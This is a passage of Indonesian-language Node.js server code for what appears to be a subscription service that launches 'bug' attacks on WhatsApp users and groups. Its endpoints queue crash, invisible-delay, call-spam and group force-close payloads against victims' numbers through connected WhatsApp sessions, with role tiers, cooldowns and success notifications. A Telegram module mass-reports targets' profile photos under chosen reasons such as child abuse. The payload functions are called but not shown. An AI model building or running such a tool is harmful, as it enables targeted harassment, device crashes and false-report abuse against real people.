        console.log(`\n[CUSTOM-PAYLOAD] 📥 Request POST Masuk | Key: ${key ? key.substring(0, 5) + '...' : 'TIDAK ADA'} | Target: ${target}`);

        if (!key || !target) {
            console.log(`[CUSTOM-PAYLOAD] ❌ Ditolak: Key atau Target kosong.`);
            return res.status(400).json({ success: false, message: "Key dan target diperlukan" });
        }

        const keyInfo = activeKeys[key];
        if (!keyInfo) {
            console.log(`[CUSTOM-PAYLOAD] ❌ Ditolak: Session key salah/tidak valid.`);
            return res.status(401).json({ success: false, message: "Session key tidak valid" });
        }

        const db = loadDatabase();
        const user = db.find(u => u.username === keyInfo.username);
        if (blockReview(user, res)) return;

        if (!user) {
            console.log(`[CUSTOM-PAYLOAD] ❌ Ditolak: User tidak ditemukan.`);
            return res.status(404).json({ success: false, message: "User tidak ditemukan" });
        }

        const routeMismatch = getRouteMismatchPayload(user, req);
        if (routeMismatch) {
            return res.json({ success: false, sended: false, cooldown: false, ...routeMismatch });
        }

        const role = normalizeRoleKey(user.role);
        const roleCooldowns = { member: 200, FULLUP: 200, RESELLER: 160, PT: 100, TK: 60, OWNER: 0, KINGZ: 0 };
        const cooldownSeconds = roleCooldowns[role] ?? 60;

        if (!user.lastSend) user.lastSend = 0;
        const now = Date.now();
        const diffSeconds = Math.floor((now - user.lastSend) / 1000);

        if (diffSeconds < cooldownSeconds) {
            return res.status(429).json({
                success: false, cooldown: true, wait: cooldownSeconds - diffSeconds,
                message: `Cooldown aktif. Tunggu ${cooldownSeconds - diffSeconds} detik`
            });
        }

        if (!bugs || !Array.isArray(bugs) || bugs.length === 0) {
            return res.status(400).json({ success: false, message: "Pilih minimal satu bug" });
        }

        const availableBugs = [
            "fcayun", "fcotax", "fcotaxx", "fcmsgx", "crash_spam", "spam_call", "hard",
            "cxinv", "mbokep", "cspam", "cspamxx", "click", "android", "invisible", "invisiblex", "ios_invis"
        ];

        for (const bugId of bugs) {
            if (!availableBugs.includes(bugId)) return res.status(400).json({ success: false, message: `Bug ID tidak valid: ${bugId}` });
        }

        const parsedDelay = parseInt(delay) || 1000;
        const parsedCount = parseInt(count) || 1;
        const cleanTarget = target.replace(/\D/g, "");

        user.lastSend = now;
        saveDatabase(db);

        const targetJid = cleanTarget + "@s.whatsapp.net";

        const otax = await getReadySender(user.username, 'pribadi');
        if (!otax) {
            return res.json({ success: false, sended: false, message: "Gagal: Sesi WhatsApp tidak aktif atau gagal terhubung. Silakan cek koneksi." });
        }

        try {
            const successFirst = await attemptRunCustomBug(otax, bugs[0], targetJid);
            if (!successFirst) {
                throw new Error("Koneksi terputus atau gagal mengirim payload custom pertama.");
            }
        } catch (err) {
            return res.json({ success: false, sended: false, message: "Gagal mengirim bug: " + err.message });
        }

        res.json({
            success: true, sended: true, cooldown: false, role, mode: 'batch', delay: parsedDelay,
            count: parsedCount, target: cleanTarget, bugCount: bugs.length, senderType: 'pribadi', message: "Payload berhasil terkirim dan sisa batch sedang diproses di background!"
        });

        customPayloadQueue.enqueue(() => processCustomPayloadJob({
            username: user.username,
            targetJid,
            bugs,
            parsedCount,
            parsedDelay,
            skipFirstBug: true
        }));
    } catch (error) {
        console.error("[API ERROR] custom-payload crash:", error.message);
        res.status(500).json({ success: false, message: "Terjadi kesalahan server" });
    }
});



app.get("/custom-payload/bugs", async (req, res) => {
    try {
        const { key } = req.query;

        if (!key) {
            return res.status(400).json({
                success: false,
                message: "Key diperlukan"
            });
        }

        const keyInfo = activeKeys[key];
        if (!keyInfo) {
            return res.status(401).json({
                success: false,
                message: "Key tidak valid"
            });
        }

        const bugs = [
            { bug_id: "cspam", bug_name: "DELAY AMAN UNTUK NOKOS" },
            { bug_id: "cspamxx", bug_name: "DELAY VISIB" },
            { bug_id: "cxinv", bug_name: "FC INVISIBLE ANDROID", description: "Invisible crash for Android" },
            { bug_id: "invisible", bug_name: "DELAY INVISIBLE", description: "Invisible message delay" },
            { bug_id: "invisiblex", bug_name: "DELAY V3", description: "Invisible Hard Delay" },

            { bug_id: "ios_invis", bug_name: "FC IOS INVISIBLE", description: "Invisible crash for iOS" },

            { bug_id: "android", bug_name: "CRASH UI", description: "Android UI crash" },
            { bug_id: "spam_call", bug_name: "SPAM CALL", description: "call spam" },

            { bug_id: "click", bug_name: "CRASH CLICK", description: "Crash on click events" }
        ];

        res.json({
            success: true,
            bugs: bugs,
            timestamp: Date.now()
        });

    } catch (error) {
        console.error("[❌ CUSTOM] Error fetching bugs:", error);
        res.status(500).json({
            success: false,
            message: "Terjadi kesalahan server"
        });
    }
});

app.get("/custom-payload/status", async (req, res) => {
    try {
        const { key } = req.query;

        if (!key) {
            return res.status(400).json({
                success: false,
                message: "Key diperlukan"
            });
        }

        const keyInfo = activeKeys[key];
        if (!keyInfo) {
            return res.status(401).json({
                success: false,
                message: "Key tidak valid"
            });
        }

        const db = loadDatabase();
        const user = db.find(u => u.username === keyInfo.username);
        if (blockReview(user, res)) return;

        if (!user) {
            return res.status(404).json({
                success: false,
                message: "User tidak ditemukan"
            });
        }

        const otax = await checkActiveSessionInFolder(user.username);
        const isConnected = otax !== null;

        const now = Date.now();
        const diffSeconds = user.lastSend ? Math.floor((now - user.lastSend) / 1000) : 0;
        const roleCooldowns = {
            member: 200, FULLUP: 200, RESELLER: 160, PT: 100, TK: 60, OWNER: 0, KINGZ: 0,
        };
        const cooldownSeconds = roleCooldowns[normalizeRoleKey(user.role)] ?? 60;
        const remainingCooldown = Math.max(0, cooldownSeconds - diffSeconds);

        res.json({
            success: true,
            username: user.username,
            role: user.role,
            isConnected: isConnected,
            cooldown: remainingCooldown > 0,
            remainingCooldown: remainingCooldown,
            lastSend: user.lastSend,
            timestamp: now
        });

    } catch (error) {
        console.error("[❌ CUSTOM] Error checking status:", error);
        res.status(500).json({
            success: false,
            message: "Terjadi kesalahan server"
        });
    }
});


app.get("/bugGroupSystems", async (req, res) => {
    try {
        const bugGroupSystems = [
            {
                id: "group_javcok",
                name: "FC NO CLICK",
                description: "Fc No Click All Memb",
                count: 5,
                delay: 1000,
                icon: "ᥫᯓ"
            },
            {
                id: "group_javhd",
                name: "BLANK GROUP",
                description: "Clik + No Click",
                count: 100,
                delay: 2000,
                icon: "ᥫᯓ"
            },
            {
                id: "group_delay",
                name: "Delay Memb Group",
                description: "Delay Group",
                count: 100,
                delay: 2000,
                icon: "ᥫ᭡"
            }
        ];


        res.json({
            valid: true,
            data: bugGroupSystems,
            bugSystems: bugGroupSystems,
            count: bugGroupSystems.length
        });
    } catch (err) {
        res.status(500).json({ valid: false, message: err.message });
    }
});



const sendBugGroupQueue = new MemoryQueue(15);

async function processSendBugGroupJob(jobData) {
    const { username, cleanGroup, bugType, historyId } = jobData;
    console.log(`\n[MEMORYQUEUE-BUG GROUP] 🚀 Memulai serangan untuk user: ${username}`);

    updateHistoryStatus(historyId, 'processing');

    try {
        let otax = null;
        const userDir = require('path').join(typeof CREDS_DIR !== 'undefined' ? CREDS_DIR : "otaxayun", username.trim());

        const findSessionInRam = () => {
            if (typeof activeConnections !== 'undefined' && require('fs').existsSync(userDir)) {
                const folders = require('fs').readdirSync(userDir);
                for (const num of folders) {
                    if (activeConnections[num] && activeConnections[num].ws && activeConnections[num].ws.readyState === 1) {
                        return activeConnections[num];
                    }
                }
            }
            return null;
        };

        otax = findSessionInRam();
        if (otax) console.log(`[MEMORYQUEUE-BUG GROUP] ✅ Sesi WA di RAM ketemu!`);

        if (!otax && typeof getValidNumbersForUser === 'function') {
            console.log(`[MEMORYQUEUE-BUG GROUP] ⚠️ Sesi RAM kosong, Memaksa Hard Reconnect...`);
            await getValidNumbersForUser(username.trim());
            await sleep(3000);
            otax = findSessionInRam();
            if (otax) console.log(`[MEMORYQUEUE-BUG GROUP] ✅ Sesi WA berhasil dibangunkan dari tidur!`);
        }

        if (!otax && typeof checkActiveSessionInFolder === 'function') {
            otax = await checkActiveSessionInFolder(username);
        }

        if (!otax) {
            console.log(`[MEMORYQUEUE-BUG GROUP] ❌ GAGAL! Sesi WA tidak aktif / terputus untuk user: ${username}`);
            updateHistoryStatus(historyId, 'failed', 'Sesi WhatsApp tidak aktif atau terputus');

            const db = loadDatabase();
            const user = db.find(u => u.username === username);
            if (user && user.fcmToken) {
                sendPushNotification(user.fcmToken, "Gagal Mengirim Bug Group ⚠️", `Serangan ke group ${cleanGroup} gagal: Sesi WA tidak aktif.`);
            }
            return;
        }

        const targetJid = `${cleanGroup}@g.us`;
        console.log(`[MEMORYQUEUE-BUG GROUP] 🎯 Target JID: ${targetJid} | Tipe: ${bugType}`);

        const bugConfigs = {
            "group_javhd": { count: 5, type: "javhd" },
            "group_javcok": { count: 5, type: "javcok" },
            "group_xnxx": { count: 100, type: "xnxx" },
            "group_delay": { count: 50, type: "delay" },
            "group_fc": { count: 1, type: "fc" },
            "group_ui": { count: 10, type: "ui" },
            "group_fcbeta": { count: 100, type: "fcbeta" },
            "group_default": { count: 5, type: "javhd" }
        };

        const config = bugConfigs[bugType] || bugConfigs.group_default;
        console.log(`[MEMORYQUEUE-BUG GROUP] ⚙️ Mengeksekusi ${config.count} tembakan tipe ${config.type}...`);

        switch (config.type) {
            case "javhd":
                for (let i = 0; i < config.count; i++) {
                    if (typeof LocaNewgbah === 'function') await LocaNewgbah(otax, targetJid).catch(e => console.log(e.message));
                    if (typeof xcoreotax === 'function') await xcoreotax(otax, targetJid, false).catch(e => console.log(e.message));
                    if (typeof packBlankGroup === 'function') await packBlankGroup(otax, targetJid).catch(e => console.log(e.message));
                    await sleep(1000);
                }
                break;
            case "javcok":
                for (let i = 0; i < config.count; i++) {
                    if (typeof NullGroups === 'function') await NullGroups(otax, targetJid).catch(e => console.log(e.message));
                }
                break;
            case "xnxx":
                for (let i = 0; i < config.count; i++) {
                    if (typeof AyunBelovedjavGb === 'function') await AyunBelovedjavGb(otax, targetJid).catch(e => console.log(e.message));
                    await sleep(1000);
                }
                break;
            case "delay":
                for (let i = 0; i < config.count; i++) {
                    if (typeof ofmcrlMantaGb === 'function') await ofmcrlMantaGb(otax, targetJid).catch(e => console.log(e.message));
                    await sleep(1000);
                }
                break;
            case "fc":
                for (let i = 0; i < config.count; i++) {
                    if (typeof nullotaxx === 'function') await nullotaxx(otax, targetJid).catch(e => console.log(e.message));
                    if (typeof crashGroupxx === 'function') await crashGroupxx(otax, targetJid).catch(e => console.log(e.message));
                    await sleep(2000);
                }
                break;
            case "ui":
                for (let i = 0; i < config.count; i++) {
                    if (typeof BugGbSange === 'function') await BugGbSange(otax, targetJid).catch(e => console.log(e.message));
                    await sleep(1000);
                }
                break;
            case "fcbeta":
                for (let i = 0; i < config.count; i++) {
                    if (typeof SqLGb === 'function') await SqLGb(otax, targetJid).catch(e => console.log(e.message));
                    await sleep(5000);
                }
                break;
        }

        console.log(`[MEMORYQUEUE-BUG GROUP] ✅ SERANGAN SELESAI DENGAN SUKSES!`);
        updateHistoryStatus(historyId, 'success');

        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (user && user.fcmToken) {
            sendPushNotification(user.fcmToken, "Bug Group Terkirim! 🚀", `Serangan bug ${bugType} ke group ${cleanGroup} sukses.`);
        }
    } catch (e) {
        console.error("[MEMORYQUEUE-BUG GROUP ERROR FATAL]", e.message);
        updateHistoryStatus(historyId, 'failed', e.message);

        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (user && user.fcmToken) {
            sendPushNotification(user.fcmToken, "Gagal Mengirim Bug Group ⚠️", `Serangan ke group ${cleanGroup} gagal: ${e.message}`);
        }
    }
}

app.get("/sendBugGroup", async (req, res) => {
    try {
        let key = req.query.key || req.headers['x-session-key'] || req.headers['session-key'];
        key = key ? key.trim() : null;
        let { group, bugType = "group_default" } = req.query;

        if (!key || !group) return res.json({ valid: false, sended: false, cooldown: false });

        let cleanGroup = group.trim().replace(/[^\d-]/g, "");
        if (!cleanGroup) return res.json({ valid: true, sended: false, cooldown: false });

        if (typeof reloadActiveKeys === 'function') reloadActiveKeys();
        const keyInfo = activeKeys[key];
        if (!keyInfo) return res.json({ valid: false, sended: false, cooldown: false });

        const db = typeof loadDatabase === 'function' ? loadDatabase() : [];
        const user = db.find(u => u.username.trim() === keyInfo.username.trim());

        if (!user) return res.json({ valid: false, sended: false, cooldown: false });
        if (typeof blockReview === 'function' && blockReview(user, { status: () => ({ json: () => { } }) })) {
            return res.json({ valid: false, sended: false });
        }

        const routeMismatch = getRouteMismatchPayload(user, req);
        if (routeMismatch) {
            return res.json({ valid: true, sended: false, cooldown: false, ...routeMismatch });
        }

        // --- MANTA FIX: Enforce global sender daily limit ---
        const globalDailyLimit = { member: 0, FULLUP: 3, RESELLER: 5, PT: 6, TK: 8, OWNER: 10, KINGZ: 99999 };
        const roleKeyForLimit = normalizeRoleKey(user.role);
        const maxGlobal = globalDailyLimit[roleKeyForLimit] ?? 3;

        if (maxGlobal !== 99999) {
            const gaCheck = getGA(user.username);
            if (gaCheck.count >= maxGlobal) {
                return res.json({
                    valid: true,
                    sended: false,
                    cooldown: false,
                    limitReached: true,
                    message: `Batas sender global hari ini habis (${maxGlobal}x). Reset besok.`,
                    attemptsLeft: 0
                });
            }
        }

        const roleCooldowns = { MEMBER: 200, FULLUP: 200, RESELLER: 160, PT: 100, TK: 60, OWNER: 0, KINGZ: 0 };
        const role = (user.role || "FULLUP").toUpperCase();
        const cooldownSeconds = roleCooldowns[role] ?? 60;

        if (!user.lastSendGroup) user.lastSendGroup = 0;
        const now = Date.now();
        const diffSeconds = Math.floor((now - user.lastSendGroup) / 1000);

        if (diffSeconds < cooldownSeconds) {
            return res.json({ valid: true, sended: false, cooldown: true, wait: cooldownSeconds - diffSeconds });
        }

        const historyId = addHistoryEntry(user.username, cleanGroup, bugType, 'group');

        // --- MANTA FIX: Increment global limit usage ---
        if (maxGlobal !== 99999) {
            incGA(user.username);
        }

        user.lastSendGroup = now;
        if (typeof saveDatabase === 'function') saveDatabase(db);


        res.json({ valid: true, sended: true, cooldown: false, bugType, historyId });



        sendBugGroupQueue.enqueue(() => processSendBugGroupJob({
            username: user.username,
            cleanGroup,
            bugType,
            historyId
        }));


    } catch (e) {
        res.json({ valid: true, sended: false, cooldown: false });
    }
});

app.post("/updateFCMToken", async (req, res) => {
    try {
        const { key, fcmToken } = req.body;
        if (!key || !fcmToken) return res.status(400).json({ success: false, message: "Key dan Token diperlukan" });

        reloadActiveKeys();
        const keyInfo = activeKeys[key];
        if (!keyInfo) return res.status(401).json({ success: false, message: "Key tidak valid" });

        const db = loadDatabase();
        const user = db.find(u => u.username === keyInfo.username);
        if (!user) return res.status(404).json({ success: false, message: "User tidak ditemukan" });

        user.fcmToken = fcmToken;
        saveDatabase(db);
        return res.json({ success: true, message: "Token FCM berhasil diperbarui" });
    } catch (err) {
        return res.status(500).json({ success: false, error: err.message });
    }
});

app.get("/bugHistory", async (req, res) => {
    try {
        const { key } = req.query;
        if (!key) return res.status(400).json({ success: false, message: "Session key is missing" });

        const validation = await validateKeyAndUser(key, req);
        if (validation.error) return res.status(validation.error.status).json({ success: false, message: validation.error.message });
        const keyInfo = validation.keyInfo;

        const history = loadHistory();
        const userHistory = history
            .filter(h => h.username === keyInfo.username)
            .reverse();

        return res.json({ success: true, history: userHistory });
    } catch (err) {
        return res.status(500).json({ success: false, error: err.message });
    }
});

app.get("/myGroup", async (req, res) => {
    try {
        const { key } = req.query;
        if (!key) return res.status(400).json({ valid: false });

        reloadActiveKeys();
        const keyInfo = activeKeys[key];
        if (!keyInfo) return res.status(401).json({ valid: false });

        const db = loadDatabase();
        const user = db.find(u => u.username === keyInfo.username);
        if (blockReview(user, res)) return;
        if (!user) return res.status(404).json({ valid: false });

        const otax = await checkActiveSessionInFolder(user.username);
        if (!otax) {
            return res.json({ valid: true, groups: [], count: 0, hasActiveSender: false });
        }

        const groupCacheKey = `groups_${user.username}`;
        const groupCacheTTL = 60000;
        if (!global._groupCache) global._groupCache = {};
        const cached = global._groupCache[groupCacheKey];
        if (cached && (Date.now() - cached.time) < groupCacheTTL) {
            return res.json(cached.data);
        }

        const jitter = Math.floor(Math.random() * 2000);
        await new Promise(r => setTimeout(r, jitter));

        let groupsAll = {};
        try { groupsAll = await safeGroupFetch(otax); } catch { }

        const groupsArray = Object.values(groupsAll);

        const groups = await Promise.all(
            groupsArray.map(async (g) => {
                let avatarUrl = "";
                try { avatarUrl = await otax.profilePictureUrl(g.id, "image"); } catch { }
                return {
                    id: g.id || "",
                    name: g.subject || g.name || "-",
                    joined: true,
                    avatarUrl: avatarUrl,
                    memberCount: g.size || (g.participants ? g.participants.length : 0) || 0
                };
            })
        );

        const validGroups = groups.filter(g => g.id && g.id.includes("@g.us"));

        const responseData = {
            valid: true,
            groups: validGroups,
            count: validGroups.length,
            hasActiveSender: true
        };

        global._groupCache[groupCacheKey] = { data: responseData, time: Date.now() };
        res.json(responseData);

    } catch (err) {
        res.status(500).json({ valid: false });
    }
});


app.post("/joinGroup", async (req, res) => {
    try {
        const { key, groupInput } = req.body;
        if (!key || !groupInput) return res.status(400).json({ valid: false, success: false });

        reloadActiveKeys();
        const keyInfo = activeKeys[key];
        if (!keyInfo) return res.status(401).json({ valid: false, success: false });

        const db = loadDatabase();
        const user = db.find(u => u.username === keyInfo.username);
        if (blockReview(user, res)) return;
        if (!user) return res.status(404).json({ valid: false, success: false });

        const otax = await checkActiveSessionInFolder(user.username);
        if (!otax) return res.json({ valid: true, success: false });

        const raw = (groupInput || "").trim();
        if (!raw) return res.json({ valid: true, success: false });

        let groupJid = "";
        let groupName = "";
        let avatarUrl = "";

        let existingGroups = {};
        try {
            await new Promise(r => setTimeout(r, Math.floor(Math.random() * 1500)));
            existingGroups = await safeGroupFetch(otax);
        } catch { }

        const groupsArray = Object.values(existingGroups);

        const tryJoinGroup = async (code) => {
            try {
                const joinResult = await otax.groupAcceptInvite(code);
                if (joinResult && joinResult.id) {
                    return joinResult.id.endsWith("@g.us") ? joinResult.id : joinResult.id + "@g.us";
                }
            } catch { }

            try {
                const response = await otax.groupGetInviteInfo(code);
                if (response && response.id) {
                    const groupId = response.id.endsWith("@g.us") ? response.id : response.id + "@g.us";
                    await otax.groupAcceptInvite(code).catch(() => { });
                    return groupId;
                }
            } catch { }

            try {
                if (typeof otax.groupJoinViaLink === 'function') {
                    const result = await otax.groupJoinViaLink(code);
                    if (result && result.id) {
                        return result.id.endsWith("@g.us") ? result.id : result.id + "@g.us";
                    }
                }
            } catch { }

            return null;
        };

        if (raw.includes("chat.whatsapp.com/")) {
            const codeMatch = raw.match(/chat\.whatsapp\.com\/([A-Za-z0-9_-]{20,24})/);
            if (!codeMatch) return res.json({ valid: true, success: false });

            const code = codeMatch[1];

            const existingGroup = groupsArray.find(g => {
                try {
                    const groupInviteCode = g.id?.replace('@g.us', '');
                    return groupInviteCode === code;
                } catch {
                    return false;
                }
            });

            if (existingGroup) {
                groupJid = existingGroup.id;
                groupName = existingGroup.subject || existingGroup.name || "-";
            } else {
                const joinedGroupId = await tryJoinGroup(code);
                if (!joinedGroupId) return res.json({ valid: true, success: false });
                groupJid = joinedGroupId;
                await new Promise(r => setTimeout(r, 3000));
                try { existingGroups = await safeGroupFetch(otax); } catch { }
            }

            const groupDetails = await otax.groupMetadata(groupJid).catch(() => null);
            if (!groupDetails) return res.json({ valid: true, success: false });

            groupName = groupDetails.subject || "-";
            const memberCount = groupDetails.participants?.length || 0;

            try { avatarUrl = await otax.profilePictureUrl(groupJid, "image"); } catch { }

            return res.json({
                valid: true,
                success: true,
                groupId: groupJid,
                groupName,
                avatarUrl,
                memberCount
            });
        }

        if (/^\d+-\d+@g\.us$/.test(raw) || raw.includes("@g.us")) {
            const jid = raw.includes("@g.us") ? raw : `${raw}@g.us`;
            const found = groupsArray.find(g => g.id === jid);
            if (!found) return res.json({ valid: true, success: false });

            groupJid = found.id;
            groupName = found.subject || found.name || "-";

            try { avatarUrl = await otax.profilePictureUrl(groupJid, "image"); } catch { }

            return res.json({
                valid: true,
                success: true,
                groupId: groupJid,
                groupName,
                avatarUrl,
                memberCount: found.size || (found.participants ? found.participants.length : 0) || 0
            });
        }

        const q = raw.toLowerCase();
        const existingGroupList = groupsArray.map(g => ({
            id: g.id,
            name: g.subject || g.name || "-"
        }));

        const found = existingGroupList.find(g =>
            g.name.toLowerCase() === q || g.name.toLowerCase().includes(q)
        );

        if (!found) return res.json({ valid: true, success: false });

        groupJid = found.id;
        groupName = found.name;

        const groupDetails = groupsArray.find(g => g.id === found.id);
        const memberCount = groupDetails?.size || (groupDetails?.participants ? groupDetails.participants.length : 0) || 0;

        try { avatarUrl = await otax.profilePictureUrl(groupJid, "image"); } catch { }

        res.json({
            valid: true,
            success: true,
            groupId: groupJid,
            groupName,
            avatarUrl,
            memberCount
        });

    } catch (err) {
        console.error("Join group error:", err);
        res.status(500).json({ valid: false, success: false });
    }
});




app.get("/checkSender", async (req, res) => {
    try {
        const { key } = req.query;
        if (!key) return res.status(400).json({ valid: false, hasActiveSender: false });

        reloadActiveKeys();
        const keyInfo = activeKeys[key];
        if (!keyInfo) return res.status(401).json({ valid: false, hasActiveSender: false });

        const db = loadDatabase();
        const user = db.find(u => u.username === keyInfo.username);
        if (blockReview(user, res)) return;
        if (!user) return res.status(404).json({ valid: false, hasActiveSender: false });

        const otax = await checkActiveSessionInFolder(user.username);
        let groupCount = 0;

        if (otax) {
            try {
                await new Promise(r => setTimeout(r, Math.floor(Math.random() * 1500)));
                const groupsAll = await safeGroupFetch(otax);
                groupCount = Object.values(groupsAll).length;
            } catch { }
        }

        res.json({
            valid: true,
            hasActiveSender: !!otax,
            groupCount
        });

    } catch {
        res.status(500).json({ valid: false, hasActiveSender: false });
    }
});



function getActiveCredsInFolder(subfolderName) {
    const folderPath = path.join(__dirname, 'otaxayun', subfolderName);
    if (!fs.existsSync(folderPath)) return [];
    const activeCreds = [];
    for (const entry of fs.readdirSync(folderPath)) {
        const stat = fs.lstatSync(path.join(folderPath, entry));
        const sessionName = stat.isDirectory() ? entry : (entry.endsWith(".json") ? path.basename(entry, ".json") : null);
        if (sessionName && activeConnections[sessionName]) activeCreds.push({ sessionName });
    }
    return activeCreds;
}


const ADD_API_STATE = {};
const API_PACKAGES_FILE = path.join(__dirname, 'apitele.json');
let API_PACKAGES = [];
try {
    const configuredPackages = JSON.parse(fs.readFileSync(API_PACKAGES_FILE, 'utf8'));
    if (Array.isArray(configuredPackages)) {
        API_PACKAGES = configuredPackages.filter(item => Number.isInteger(item?.apiId) && typeof item?.apiHash === 'string' && item.apiHash.length > 0);
    }
} catch (error) {
    console.error('[CONFIG] Failed to load Telegram API packages:', error.message);
}

const selectedApiPackage = API_PACKAGES[Math.floor(Math.random() * API_PACKAGES.length)] || {};
const API_ID = Number(process.env.TELEGRAM_API_ID || selectedApiPackage.apiId || 0);
const API_HASH = process.env.TELEGRAM_API_HASH || selectedApiPackage.apiHash || '';




const SESSION_DIR_TELEGRAM = path.join(__dirname, 'sessions');
if (!fs.existsSync(SESSION_DIR_TELEGRAM)) {
    fs.mkdirSync(SESSION_DIR_TELEGRAM, { recursive: true });
}


function generateSessionKey() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

function getUserDir(username) {
    const userDir = path.join(SESSION_DIR_TELEGRAM, username);
    if (!fs.existsSync(userDir)) {
        fs.mkdirSync(userDir, { recursive: true });
    }
    return userDir;
}

function saveUserData(username, data) {
    const userDir = getUserDir(username);
    const dataFile = path.join(userDir, 'data.json');

    let existingData = {};
    if (fs.existsSync(dataFile)) {
        existingData = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
    }

    const newData = { ...existingData, ...data };
    fs.writeFileSync(dataFile, JSON.stringify(newData, null, 2));
    return newData;
}

function saveSession(username, session) {
    const userDir = getUserDir(username);
    const sessionsFile = path.join(userDir, 'sessions.json');

    let sessions = [];
    if (fs.existsSync(sessionsFile)) {
        sessions = JSON.parse(fs.readFileSync(sessionsFile, 'utf8'));
    }


    sessions = sessions.filter(s => s.phoneNumber !== session.phoneNumber);
    sessions.push(session);

    fs.writeFileSync(sessionsFile, JSON.stringify(sessions, null, 2));
    return sessions;
}

function saveReport(username, report) {
    const userDir = getUserDir(username);
    const reportsFile = path.join(userDir, 'reports.json');

    let reports = [];
    if (fs.existsSync(reportsFile)) {
        reports = JSON.parse(fs.readFileSync(reportsFile, 'utf8'));
    }

    reports.unshift(report);
    if (reports.length > 100) {
        reports = reports.slice(0, 100);
    }

    fs.writeFileSync(reportsFile, JSON.stringify(reports, null, 2));
    return reports;
}


const telegramClients = new Map();
const telegramClientLastUse = new Map();

async function getTelegramClient(sessionString) {
    if (telegramClients.has(sessionString)) {
        telegramClientLastUse.set(sessionString, Date.now());
        return telegramClients.get(sessionString);
    }

    const session = new StringSession(sessionString);
    const client = new TelegramClient(session, API_ID, API_HASH, {
        connectionRetries: 3,
        retryDelay: 2000,
        timeout: 30000,
        requestRetries: 3,
        autoReconnect: true,
    });

    await client.connect();
    telegramClients.set(sessionString, client);
    telegramClientLastUse.set(sessionString, Date.now());
    return client;
}

setInterval(() => {
    const now = Date.now();
    for (const [key, client] of telegramClients) {
        const lastUse = telegramClientLastUse.get(key) || 0;
        if (now - lastUse > 10 * 60 * 1000) {
            client.disconnect().catch(() => { });
            telegramClients.delete(key);
            telegramClientLastUse.delete(key);
        }
    }
}, 5 * 60 * 1000);

async function sendTelegramReport(client, target_username, reason, custom_message) {
    try {

        const resolved = await client.invoke(
            new Api.contacts.ResolveUsername({
                username: target_username.replace('@', '')
            })
        );

        const user = resolved.users?.[0];
        if (!user) {
            return { success: false, message: 'User tidak ditemukan' };
        }


        const peer = new Api.InputPeerUser({
            userId: user.id,
            accessHash: user.accessHash
        });


        const photos = await client.invoke(
            new Api.photos.GetUserPhotos({
                userId: peer,
                offset: 0,
                maxId: 0,
                limit: 1
            })
        );

        const photo = photos.photos.find(p => p instanceof Api.Photo);
        if (!photo) {
            return { success: false, message: 'User tidak punya foto profil' };
        }


        const inputPhoto = new Api.InputPhoto({
            id: photo.id,
            accessHash: photo.accessHash,
            fileReference: photo.fileReference
        });


        const result = await client.invoke(
            new Api.account.ReportProfilePhoto({
                peer: peer,
                photoId: inputPhoto,
                reason: getPhotoReportReason(reason), // Gunakan konstruktor InputReportReason*
                message: custom_message || ''
            })
        );

        console.log('Report result:', result);
        return { success: true, message: 'Report profile photo berhasil' };

    } catch (err) {
        console.error('[REPORT PROFILE PHOTO ERROR]', err);
        return {
            success: false,
            message: err.errorMessage || err.message || 'Unknown error'
        };
    }
}


function getPhotoReportReason(reason) {
    switch (reason.toLowerCase()) {
        case 'spam':
            return new Api.InputReportReasonSpam(); // #58dbcab8

        case 'violence':
            return new Api.InputReportReasonViolence(); // #1e22c78d

        case 'pornography':
            return new Api.InputReportReasonPornography(); // #2e59d922

        case 'child_abuse':
            return new Api.InputReportReasonChildAbuse(); // #adf44ee3

        case 'fake':
            return new Api.InputReportReasonFake(); // #f5ddd6e7

        case 'drugs':
            return new Api.InputReportReasonIllegalDrugs(); // #a8eb2be

        case 'personal_data':
            return new Api.InputReportReasonPersonalDetails(); // #9ec7863d

        case 'copyright':
            return new Api.InputReportReasonCopyright(); // #9b89f93a

        case 'georelevant':
            return new Api.InputReportReasonGeorelevant(); // #dbdd4feed

        default:
            return new Api.InputReportReasonOther(); // #c1e4a2b1
    }
}




app.post('/api/telegram/request-otp', async (req, res) => {
    try {
        const { phone_number } = req.body;

        if (!phone_number || !phone_number.startsWith('+')) {
            return res.status(400).json({
                success: false,
                message: 'Invalid phone number format. Use format: +6281234567890'
            });
        }


        const session = new StringSession('');
        const client = new TelegramClient(session, API_ID, API_HASH, {
            connectionRetries: 5,
        });

        await client.connect();


        const { phoneCodeHash } = await client.sendCode({
            apiId: API_ID,
            apiHash: API_HASH,
        }, phone_number);


        const loginData = {
            phoneNumber: phone_number,
            phoneCodeHash,
            clientSession: session.save(),
            timestamp: Date.now()
        };

        const tempFile = path.join(__dirname, 'temp_login.json');
        let logins = {};
        if (fs.existsSync(tempFile)) {
            logins = JSON.parse(fs.readFileSync(tempFile, 'utf8'));
        }
        logins[phone_number] = loginData;
        fs.writeFileSync(tempFile, JSON.stringify(logins, null, 2));


        const debugOtp = Math.floor(100000 + Math.random() * 900000).toString();

        res.json({
            success: true,
            message: 'OTP sent to Telegram',
            debug_otp: debugOtp,
            phone_number: phone_number
        });

    } catch (error) {
        console.error('Request OTP error:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

const rateLimit = new Map();
const MAX_REQUESTS_PER_MINUTE = 10;


function validateSession(sessionKey) {

    return sessionKey && sessionKey.length > 20;
}


app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        services: {
            whatsapp: 'available',
            telegram: 'available',
            api: 'v1.0'
        }
    });
});

const randomBucinRateLimit = new Map();
const RANDOM_BUCIN_URL = 'https://api.nexadev.my.id/api/random/quotebucin/';

app.get(['/api/randoom-bucin', '/api/random-bucin'], async (req, res) => {
    const clientIp = req.ip || req.socket.remoteAddress || 'unknown';
    const now = Date.now();
    const previousRequest = randomBucinRateLimit.get(clientIp) || 0;
    if (now - previousRequest < 1500) {
        return res.status(429).json({
            success: false,
            message: 'Terlalu banyak request. Coba lagi sebentar.'
        });
    }
    randomBucinRateLimit.set(clientIp, now);

    try {
        const response = await axios.get(RANDOM_BUCIN_URL, {
            timeout: 10000,
            validateStatus: status => status >= 200 && status < 300,
        });
        const upstreamData = response.data;
        const payload = upstreamData && typeof upstreamData === 'object' && !Array.isArray(upstreamData)
            ? { ...upstreamData, author: 'KAZE X' }
            : { data: upstreamData, author: 'KAZE X' };

        return res.json(payload);
    } catch (error) {
        console.error('[RANDOM BUCIN]', error.message);
